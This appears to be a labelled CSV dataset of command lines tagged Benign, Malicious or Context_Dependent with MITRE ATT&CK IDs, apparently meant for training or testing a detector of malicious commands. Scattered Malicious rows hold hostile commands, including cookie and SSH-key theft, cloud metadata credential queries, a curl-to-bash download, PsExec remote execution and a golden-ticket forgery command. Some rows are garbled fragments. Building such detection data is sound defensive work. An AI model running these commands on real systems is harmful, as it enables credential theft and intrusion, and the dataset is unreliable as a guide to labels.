command,label,original_label,mitre_id
chezmoi init repository_url,Benign,Benign,Benign
ndctl list -vvv --namespace=namespaceX.Y,Benign,Benign,Benign
findmnt LABEL=BigStorage,Context_Dependent,Benign,Benign
pio device list,Benign,Benign,Benign
find / -mtime +100 -print,Context_Dependent,Benign,Benign
"find Folder1 -type f -regextype posix-extended \( ! -regex '.+\-[0-9]{2,4}x[0-9]{2,4}\.jpg' \) -print0 | xargs -0 cp -p --target-directory=Folder2",Benign,Benign,Benign
perl -n -e 'print if m/regex1/ and m/regex2/i',Benign,Benign,Benign
find /path/to/junk/files -type f -mtime +31 -exec rm -f {} \;,Benign,Benign,Benign
sl -F,Benign,Benign,Benign
imv -t 10 path/to/directory,Benign,Benign,Benign
konsave [-e|--export-profile] profile_name,Benign,Benign,Benign
find . -iname *.js -type f -exec sed 's/^\xEF\xBB\xBF//' -i.bak {} \; -exec rm {}.bak \;,Benign,Benign,Benign
find /TBD -mtime +1 -type d | xargs rm -f -r,Benign,Benign,Benign
"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""$destination_path""' -e 'set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"")' -e 'duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",Malicious,Malicious,T1539
tlmgr pinning add repository package1 package2 ...,Benign,Benign,Benign
rmdir path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
jobs -x echo %1,Benign,Benign,Benign
ipfs repo gc,Benign,Benign,Benign
regini.exe {PATH}:hidden.ini,Malicious,Malicious,T1564
lt [-p|--port] 8000,Benign,Benign,Benign
sudo lvconvert [-m|--mirrors] 0 /dev/vg_name/lv_name,Benign,Benign,Benign
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key,Malicious,Malicious,T1552
apptainer verify path/to/image.sif,Benign,Benign,Benign
fabric [-p|--pattern] pattern1 | fabric [-p|--pattern] pattern2,Benign,Benign,Benign
kernel32.beep,Malicious,Malicious,T1497
) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (,Malicious,Malicious,T1027
laravel list,Benign,Benign,Benign
readlink /proc/2/exe,Context_Dependent,Synthetic,Synthetic
hub pr checkout pr_number,Benign,Benign,Benign
carp,Benign,Benign,Benign
ssh-add path/to/private_key,Benign,Benign,Benign
sq verify --signer-file path/to/signer.asc --signature-file path/to/file.sig path/to/file,Benign,Benign,Benign
pacconf --single,Benign,Benign,Benign
server: https://x,Malicious,Malicious,T1059
devpod up github.com/user/repo [-i|--ide] vscode,Benign,Benign,Benign
vpnd,Benign,Benign,Benign
split [-n|--number] 5 path/to/file,Benign,Benign,Benign
guetzli input.jpg output.jpg,Benign,Benign,Benign
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad,Context_Dependent,Malicious,T1012
gh workflow enable|disable id|workflow_name|filename.yml,Benign,Benign,Benign
brightnessctl [s|set] 10%-,Benign,Benign,Benign
ROPgadget --binary path/to/binary --re regex,Benign,Benign,Benign
betterlockscreen [-l|--lock],Benign,Benign,Benign
C:\Users\<username>\Documents\Outlook Files,Malicious,Malicious,T1114
rsh remote_host [-l|--user] username ls -l,Benign,Benign,Benign
nix-shell [-p|--packages] package1 package2 ... [-I|--include] nixpkgs=https://github.com/NixOS/nixpkgs/archive/nixpkgs_revision.tar.gz,Benign,Benign,Benign
virt-qemu-run [-r|--root] path/to/directory path/to/guest.xml,Benign,Benign,Benign
sudo tmutil stopbackup,Benign,Benign,Benign
sudo do-release-upgrade [-d|--devel-release],Benign,Benign,Benign
doggo MX codeberg.org @1.1.1.2,Benign,Benign,Benign
who -la,Context_Dependent,Benign,Benign
flutter run -d all,Benign,Benign,Benign
neofetch --os_arch on|off,Benign,Benign,Benign
diff -Naur dir1/ dir2/,Benign,Benign,Benign
findfs UUID=uuid,Benign,Benign,Benign
pg_controldata [-?|--help],Benign,Benign,Benign
codecrafters test,Benign,Benign,Benign
dwebp path/to/input.webp -o path/to/output.png -mt,Benign,Benign,Benign
spike clean,Benign,Benign,Benign
calc help intro,Benign,Benign,Benign
3d-ascii-viewer --interactive path/to/model.obj,Benign,Benign,Benign
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*,Malicious,Malicious,T1003
pacman -Fq filename,Benign,Benign,Benign
dpigs [-s|--status] path/to/file,Benign,Benign,Benign
install path/to/source_file1 path/to/source_file2 ... path/to/destination,Benign,Benign,Benign
find -daystart -mtime +7,Benign,Benign,Benign
"resticprofile --name ""group_name"" schedule",Benign,Benign,Benign
xcodes runtimes install runtime_name,Benign,Benign,Benign
xcrun --toolchain name,Benign,Benign,Benign
<Ctrl b><w>,Benign,Benign,Benign
mkdocs serve,Benign,Benign,Benign
helm [dep|dependency] [up|update],Benign,Benign,Benign
scc [-h|--help],Benign,Benign,Benign
who -q,Context_Dependent,Synthetic,Synthetic
cake cache clear_all,Benign,Benign,Benign
sudo urpme --auto-orphans,Benign,Benign,Benign
picttoppm [-fu|-fullres] path/to/file.pict > path/to/file.ppm,Benign,Benign,Benign
web-ext sign --api-key api_key --api-secret api_secret,Benign,Benign,Benign
uniq -c | sort -n | tail -n1,Benign,Benign,Benign
mpc next,Benign,Benign,Benign
sudo arpspoof -i wlan0 host_ip,Benign,Benign,Benign
echo $ENCODED > $encoded_file && cat < $encoded_file | xxd -r -p,Malicious,Malicious,T1140
find . -maxdepth 2 -size +100000 -exec bzip2 {} \;,Benign,Benign,Benign
find /home/david -amin -10 -name '*.c',Context_Dependent,Benign,Benign
uv publish --publish-url https://upload.pypi.org/legacy/,Benign,Benign,Benign
wezterm --config-file path/to/config_file,Benign,Benign,Benign
find /foldername | sort -n | tail -1,Benign,Benign,Benign
echo ldapadd -H ldap://$domain.$top_level_domain:389 -x -D $admin_user -w $admin_password -f tempadmin.ldif,Malicious,Malicious,T1136
find /usr /home -name findme.txt -type f -print,Benign,Benign,Benign
kubectl debug pod_name [-it|--stdin --tty] --copy-to pod_copy_name --container container_name -- command,Benign,Benign,Benign
"find / -name ""*.txt"" -xdev 2> /dev/null",Context_Dependent,Benign,Benign
hledger [bal|balance] type:X [-MTAS|--monthly --row-total --average --sort-amount] --budget [-t|--tree] [-2|--depth 2] --no-elide,Benign,Benign,Benign
qrencode [-t|--type] ansiutf8 string,Benign,Benign,Benign
systemd-id128 invocation-id,Benign,Benign,Benign
youtube-dl [-x|--extract-audio] --audio-format mp3 'url',Benign,Benign,Benign
pidof -s bash,Context_Dependent,Benign,Benign
find /home -depth -print | cpio -ov -0 /dev/rmt0 | tee -a tape.log,Context_Dependent,Benign,Benign
Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=$uac_prop)' -Server $domain,Context_Dependent,Malicious,T1087
kaggle [c|competitions] leaderboard competition_name --show|--download,Benign,Benign,Benign
tldr pio debug,Benign,Benign,Benign
cs java -version,Benign,Benign,Benign
srun --ntasks-per-node num_cores --mem-per-cpu memory_MB --pty /bin/bash,Benign,Benign,Benign
kinit -p principal@REALM,Benign,Benign,Benign
"apptainer push [-D|--description] ""description"" path/to/image.sif library://user/collection/container:tag",Benign,Benign,Benign
gitlab job_play project_name job_id,Benign,Benign,Benign
Get-WUHistory,Benign,Benign,Benign
shred -v -n 1 -z -u /path/to/your/file,Benign,Benign,Benign
httpx -probe [-u|-target] url|host|ipaddress|subnet_with_cidr,Benign,Benign,Benign
cargo publish,Benign,Benign,Benign
verilator --binary --build-jobs 0 -Wall path/to/source.v,Benign,Benign,Benign
sfdk emulator exec emulator,Benign,Benign,Benign
crackle -i path/to/input.pcap,Benign,Benign,Benign
sdcv --use-dict dictionary_name search_term,Benign,Benign,Benign
cat infile | od -c,Benign,Benign,Benign
lpadmin -p printer -c class,Benign,Benign,Benign
sudo loadkeys [-d|--default],Benign,Benign,Benign
kk_KZ,Context_Dependent,Malicious,T1614
bshell --vnc,Benign,Benign,Benign
mkfs.erofs --all-root image.erofs root/,Benign,Benign,Benign
$STANDARD_INFORMATION,Malicious,Malicious,T1070
who -m | awk '{print $1;}',Context_Dependent,Benign,Benign
git summary --line,Benign,Benign,Benign
"Get-Item -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnceEx""",Context_Dependent,Malicious,T1012
sudo arptables-save > path/to/file,Benign,Benign,Benign
latexmk -c path/to/source.tex,Benign,Benign,Benign
colima start --runtime containerd,Benign,Benign,Benign
xctool -project YourProject.xcodeproj -scheme YourScheme build,Benign,Benign,Benign
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},Malicious,Malicious,T1105
cat $File_to_output,Context_Dependent,Malicious,T1083
chage -l postgres,Context_Dependent,Synthetic,Synthetic
vcpkg install --triplet=wasm32-emscripten zlib,Benign,Benign,Benign
pueue reset [-f|--force],Benign,Benign,Benign
qc exec --command --last,Benign,Benign,Benign
ffplay path/to/file,Benign,Benign,Benign
"mdfind ""query""",Benign,Benign,Benign
"sm ""Hello World!""",Benign,Benign,Benign
carbon-now [-e|--end] line path/to/file,Benign,Benign,Benign
git bug push,Benign,Benign,Benign
expand path\to\file.cab path\to\directory -i,Benign,Benign,Benign
darling shell,Benign,Benign,Benign
mysides remove $(basename $(pwd)),Benign,Benign,Benign
sudo bridge [v|vlan] [d|delete] dev lanX vid vlan_id,Benign,Benign,Benign
conda package --pkg-name name,Benign,Benign,Benign
gnome-software --mode updates|updated|installed|overview,Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$target -accepteula -s ""cmd.exe""",Malicious,Malicious,T1053
"find . -type f \( -iname ""*.c"" -or -iname ""*.asm"" \)",Benign,Benign,Benign
datashader_cli points path/to/input_data.geo.parquet path/to/output_data.png --geo true,Benign,Benign,Benign
cheatshh [-ec|--edit-command],Benign,Benign,Benign
pstree -p 20238 | sed 's/(/\n(/g' | grep '(' | sed 's/(\(.*\)).*/\1/',Context_Dependent,Benign,Benign
pixi config prepend key value,Benign,Benign,Benign
iostat -w 3 -c 10 disk1,Benign,Benign,Benign
wermgr.exe,Malicious,Malicious,T1055
find /dir/to/search/ -type f -name 'regex' -print,Benign,Benign,Benign
"ping -i seconds ""host""",Benign,Benign,Benign
ip address dhcp,Benign,Benign,Benign
py python_arguments,Benign,Benign,Benign
llvd [-c|--course] course-slug [-r|--resolution] 720,Benign,Benign,Benign
cargo info package@version,Benign,Benign,Benign
known_host,Malicious,Malicious,T1041
sass --watch inputfile.scss|inputfile.sass,Benign,Benign,Benign
ppmfade -f path/to/image1.ppm -l path/to/image2.ppm -mix|spread|shift|relief|oil|... -base base,Benign,Benign,Benign
rustup override set nightly,Benign,Benign,Benign
trafilatura [-u|--URL] url --with-comments,Benign,Benign,Benign
qalc [-t|--terse],Benign,Benign,Benign
guacd -b 127.0.0.1 -l 4823,Benign,Benign,Benign
ytfzf [-m|--audio-only] [-a|--auto-select] [-l|--loop] search_pattern,Benign,Benign,Benign
tar cvf - path/to/directory | lz4 - dir.tar.lz4,Benign,Benign,Benign
pkg [up|upgrade],Benign,Benign,Benign
pro security-status --unavailable,Benign,Benign,Benign
sdkmanager --list,Benign,Benign,Benign
GetBucketAcl,Context_Dependent,Malicious,T1069
hyprctl hyprsunset temperature temperature,Benign,Benign,Benign
$which_python $python_binary_name,Malicious,Malicious,T1059
git status --branch --porcelain | grep '##' | cut -c 4- | cut -d'.' -f1,Benign,Benign,Benign
"su -c ""cd /tmp; curl -s $remote_url | bash"" art",Malicious,Malicious,T1110
mosquitto_sub [-t|--topic] sensors/machines/+/temperature/+,Benign,Benign,Benign
"Start-Service -Name ""$service_name""",Malicious,Malicious,T1543
yes n | gunzip file*.gz,Benign,Benign,Benign
find . -size 10 print,Benign,Benign,Benign
fastmod --accept-all --print-changed-files --fixed-strings exact_string replacement,Benign,Benign,Benign
echo '3' | ajson '2 * pi * $',Benign,Benign,Benign
grep -i error /var/log/boot.log,Context_Dependent,Synthetic,Synthetic
find $backup_path/* -name *.sql -mtime +30 -exec rm {} \;,Benign,Benign,Benign
ls 2>&1 | tee /tmp/ls.txt,Benign,Benign,Benign
b3sum [-c|--check] --quiet path/to/file.b3,Benign,Benign,Benign
sudo squid -N,Benign,Benign,Benign
kubectl config current-context,Benign,Benign,Benign
find -path './Linux/*' -name teste.tex,Benign,Benign,Benign
blastn -query query.fa -subject subject.fa -evalue 1e-9,Benign,Benign,Benign
kpackagetool5 [-t|--type] package_type [-u|--upgrade] path/to/directory,Benign,Benign,Benign
mailsy me,Benign,Benign,Benign
"systemd-ask-password ""prompt""",Benign,Benign,Benign
cradle sql populate package,Benign,Benign,Benign
oma show,Benign,Benign,Benign
transmission-cli [-w|--download-dir] path/to/download_directory url|magnet|path/to/file,Benign,Benign,Benign
smbserver.py -outputfile path/to/output_file sharename path/to/share,Benign,Benign,Benign
zstd [-d|--decompress] [-c|--stdout] path/to/file.zst,Benign,Benign,Benign
pacman4console,Benign,Benign,Benign
chage -l admin,Context_Dependent,Synthetic,Synthetic
tail -n +347340107 filename | head -n 100,Benign,Benign,Benign
"if ($row.FileShareName -ne """"){",Malicious,Malicious,T1530
git check-ignore --no-index path/to/file_or_directory1 path/to/file_or_directory2 ...,Benign,Benign,Benign
exercism open path/to/directory,Benign,Benign,Benign
toolbox list [-i|--images],Benign,Benign,Benign
func new,Benign,Benign,Benign
sudo gpm -k,Benign,Benign,Benign
"find . -type f -name ""*.php"" -exec grep --with-filename -c ""^use "" {} \; | sort -t "":"" -k 2 -n -r",Benign,Benign,Benign
file /bin/pwd,Context_Dependent,Malicious,T1083
"who | awk '{ print $1; }' | sort -u | awk '{print $1; u++} END{ print ""users: "" u}'",Context_Dependent,Benign,Benign
cat $i | xargs mv -t dir.$count,Benign,Benign,Benign
most path/to/file,Benign,Benign,Benign
aws backup delete-backup-plan --backup-plan-id id,Benign,Benign,Benign
"Write-Output ""Function code upload failed.""",Malicious,Malicious,T1528
protector -free branches_regex -repos organization/repository,Benign,Benign,Benign
cd path/to/subdirectory && dvc init --sudir,Benign,Benign,Benign
pnmpsnr path/to/file1.pnm path/to/file2.pnm -target n,Benign,Benign,Benign
gow run . argument1 argument2 ...,Benign,Benign,Benign
tldr paste,Benign,Benign,Benign
pw-cat [-r|--record] [-m|--midi] path/to/file.mid,Benign,Benign,Benign
git gui blame path/to/file,Benign,Benign,Benign
glxgears -info,Benign,Benign,Benign
strip-nondeterminism --type filetype path/to/file,Benign,Benign,Benign
systemctl service-log-target service_name console,Benign,Benign,Benign
systemctl reload pipewire --user,Benign,Benign,Benign
cat log | tr -s [:blank:] |cut -d' ' -f 3-,Benign,Benign,Benign
nmap -sS 192.168.1.1,Context_Dependent,Synthetic,Synthetic
nix store delete /nix/store/checksum-package-version.ext,Benign,Benign,Benign
pio test --upload-port upload_port,Benign,Benign,Benign
ss -o state established,Context_Dependent,Synthetic,Synthetic
sudo ip [r|route] [d|delete] destination_ip dev ethX,Benign,Benign,Benign
codespell [-w|--write-changes],Benign,Benign,Benign
driverquery /v,Benign,Benign,Benign
sudo vpnc-disconnect,Benign,Benign,Benign
az vm create [-g|--resource-group] rg [-n|--name] vm_name --image UbuntuLTS --admin-user azureuser --generate-ssh-keys,Benign,Benign,Benign
clj,Benign,Benign,Benign
"Invoke-RestMethod -Headers @{""Metadata""=""true""} -Method GET -Uri ""http://169.254.169.254/metadata/instance?api-version=2021-02-01"" | ConvertTo-Json -Depth 64 > $output_file",Malicious,Malicious,T1552
scrcpy [-r|--record] path/to/file.mp4,Benign,Benign,Benign
sic,Benign,Benign,Benign
"find kat -type f \( -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.h"" \)",Benign,Benign,Benign
i3status,Benign,Benign,Benign
git diff --name-only | xargs dirname | uniq,Benign,Benign,Benign
/systemd/system,Malicious,Malicious,T1543
"find ./ -name ""somename.txt""",Benign,Benign,Benign
sudo nft delete rule inet filter input handle 3,Benign,Benign,Benign
"$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null",Malicious,Malicious,T1552
ioping [-R|-rapid] /dev/sdX,Benign,Benign,Benign
kustomize create --autodetect,Benign,Benign,Benign
elasticsearch-keystore remove setting_name,Benign,Benign,Benign
kubeseal --fetch-cert --username username --password password > cert.pem,Benign,Benign,Benign
sudo mke2fs -t ext2 /dev/sdXY,Benign,Benign,Benign
syncthing --gui-address ip_address:port|path/to/socket.sock,Benign,Benign,Benign
"trdsql -ocsv -oh ""SELECT * FROM path/to/directory/*.json"" | sed 's/\([^,]*\)/""&""/g' > path/to/file.csv",Benign,Benign,Benign
go fmt path/to/package,Benign,Benign,Benign
pw-mon [-r|--remote] remote_name,Benign,Benign,Benign
berks upload cookbook,Benign,Benign,Benign
v=$(whoami | perl -e 'print uc <>'),Benign,Benign,Benign
"split -l ${2:-10000} -d -a 6 ""$1"" ""${tdir}/x""",Benign,Benign,Benign
chgrp -R git .git,Benign,Benign,Benign
srm [-i|--interactive] \*,Benign,Benign,Benign
DeviceInformation,Context_Dependent,Malicious,T1082
"say --voice ""?""",Benign,Benign,Benign
"local -r variable=""value""",Benign,Benign,Benign
uv pip sync requirements.txt,Benign,Benign,Benign
duperemove -r -d --hashfile=path/to/hashfile path/to/directory,Benign,Benign,Benign
httpsvc,Malicious,Malicious,T1543
docker container inspect container1_name container2_name ...,Benign,Benign,Benign
agg --font-size 24 path/to/demo.cast path/to/demo.gif,Benign,Benign,Benign
showfigfonts,Benign,Benign,Benign
echo $(yes image.png | head -n10),Benign,Benign,Benign
"oathtool --totp [-b|--base32] ""secret"" ""token""",Benign,Benign,Benign
pnmtoxwd path/to/input_file.pnm > path/to/output_file.xwd,Benign,Benign,Benign
sudo trip example.com --protocol udp --source-port 5000,Benign,Benign,Benign
llvm-mc --filetype=obj -o path/to/output.o path/to/input.s,Benign,Benign,Benign
"find . -name ""new*.sh"" -exec rm -f '{}' \;",Benign,Benign,Benign
pdfimages -png path/to/file.pdf filename_prefix,Benign,Benign,Benign
"history -d ""$1""",Context_Dependent,Benign,Benign
find /home/username/public_html/sites/all/themes -type f -exec chmod 640 {} +,Context_Dependent,Benign,Benign
autoload -Uz function_name,Benign,Benign,Benign
"find . -type f -newermt ""Aug 10"" ! -newermt ""Aug 17"" -exec rm {} \;",Benign,Benign,Benign
"find /store/01 -name ""*.fits"" -exec chmod -x+r {} \; -exec ls -l {} \; | tee ALL_FILES.LOG",Benign,Benign,Benign
samtools view -S [-b|--bam] input.sam > output.bam,Benign,Benign,Benign
find /home -writable -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
install-tl -profile path/to/texlive.profile,Benign,Benign,Benign
jj new revset1 revset2 ...,Benign,Benign,Benign
"sudo tune2fs -o discard,user_xattr /dev/sdXN",Benign,Benign,Benign
imhex --hexdump path/to/file,Benign,Benign,Benign
fail2ban-client add x,Malicious,Malicious,T1059
osmium extract [-p|--polygon] path/to/polygon.geojson path/to/input.pbf [-o|--output] path/to/output.pbf,Benign,Benign,Benign
VBoxManage clonevm vm_name --register,Benign,Benign,Benign
"tac temp.txt | sort -k2,2 -r -u",Benign,Benign,Benign
gradle build,Benign,Benign,Benign
"Import-Module ""$ps_module""",Malicious,Malicious,T1048
uuidgen [-t|--time],Benign,Benign,Benign
tldr find,Benign,Benign,Benign
maestral resume,Benign,Benign,Benign
export VARIABLE=value,Benign,Benign,Benign
ssh-agent /bin/sh,Malicious,Malicious,T1059
amass -help,Benign,Benign,Benign
find / -perm -u+s,Context_Dependent,Benign,Benign
tcpdump -i enp0s3 -n,Context_Dependent,Synthetic,Synthetic
msinfo32.exe,Malicious,Malicious,T1036
iw dev wlp connect SSID,Benign,Benign,Benign
cradle package install package_name,Benign,Benign,Benign
"echo ""### BEGIN INIT INFO"" >> /etc/init.d/T1543.002",Malicious,Malicious,T1543
crush [-v|--version],Benign,Benign,Benign
"elasticsearch-create-enrollment-token [-s|--scope] kibana --url ""IP""",Benign,Benign,Benign
"find . -name ""new*.sh""",Benign,Benign,Benign
svgo [-f|--folder] path/to/input_directory [-o|--output] path/to/output_directory,Benign,Benign,Benign
diskutil unmountDisk /dev/disk,Benign,Benign,Benign
aws configure wizard,Benign,Benign,Benign
"x8 [-u|--url] https://example.com/ [-X|--method] POST [-b|--body] '{{{""x"":{%s\}\}}}' [-w|--wordlist] path/to/wordlist.txt",Benign,Benign,Benign
jobs -r,Benign,Benign,Benign
snyk monitor,Benign,Benign,Benign
"git blame -L '/text/',+10 path/to/file",Benign,Benign,Benign
nslookup `hostname`,Benign,Benign,Benign
pnmcrop -bg-corner topleft|topright|bottomleft|bottomright path/to/image.pnm > path/to/output.pnm,Benign,Benign,Benign
hostname -i,Context_Dependent,Benign,Benign
"units ""15 megabytes"" bytes",Benign,Benign,Benign
macchina,Benign,Benign,Benign
lualatex -jobname=filename path/to/file.tex,Benign,Benign,Benign
crane export image_name -,Benign,Benign,Benign
fastlane run build_app,Benign,Benign,Benign
"cmd.exe /c ""$local_folder\$local_executable"" golden /aes256:$krbtgt_aes256_key /ldap /user:$account /dc:$($domaincontroller) /printcmd /outfile:golden",Malicious,Malicious,T1558
hcitool lq bdaddr,Benign,Benign,Benign
rustfmt path/to/source.rs,Benign,Benign,Benign
gh project item-add number --owner owner --url issue_or_pr_url,Benign,Benign,Benign
tree -I 'directory_name1|directory_name2',Benign,Benign,Benign
dnf builddep --help-cmd,Benign,Benign,Benign
pamflip [-lr|-leftright] path/to/input.pam > path/to/output.pam,Benign,Benign,Benign
beet stats,Benign,Benign,Benign
find $search_path -name id_rsa 2>/dev/null -exec gcp --parents {} $output_folder \;,Malicious,Malicious,T1552
sudo semanage export [-f|--output_file] path/to/file,Benign,Benign,Benign
prt-get sysup,Benign,Benign,Benign
ncftp,Malicious,Malicious,T1059
pbmtoescp2 path/to/image.pbm > path/to/output.escp2,Benign,Benign,Benign
Expand-Archive -Path path\to\example.zip -DestinationPath path\to\extracted_files -Force,Benign,Benign,Benign
npm [c|config] get key,Benign,Benign,Benign
http-server path/to/directory [-p|--port] port,Benign,Benign,Benign
fastfetch [-l|--logo] none,Benign,Benign,Benign
adb pull path/to/device_file_or_directory path/to/local_destination_directory,Benign,Benign,Benign
valgrind --tool=cachegrind program,Benign,Benign,Benign
sudo extrace -u,Benign,Benign,Benign
meteor add package,Benign,Benign,Benign
Security Settings\Local Policies\Audit Policy,Malicious,Malicious,T1562
find /etc -type f -print0 2>/dev/null | xargs -0 grep --color=AUTO -Hn 'nameserver' 2>/dev/null,Benign,Benign,Benign
pylint package_or_module,Benign,Benign,Benign
ls -d */ | xargs -iA cp file.txt A,Benign,Benign,Benign
VSDiagnostics.exe start 1 /launch:{PATH:.exe},Malicious,Malicious,T1127
uuidparse uuid1 uuid2 ...,Benign,Benign,Benign
msbuild path/to/project_file /toolsversion:version,Benign,Benign,Benign
flox activate,Benign,Benign,Benign
chpass -s path/to/shell,Benign,Benign,Benign
rename 's/^fgh/jkl/' fgh*,Benign,Benign,Benign
hwinfo --all --log path/to/file,Benign,Benign,Benign
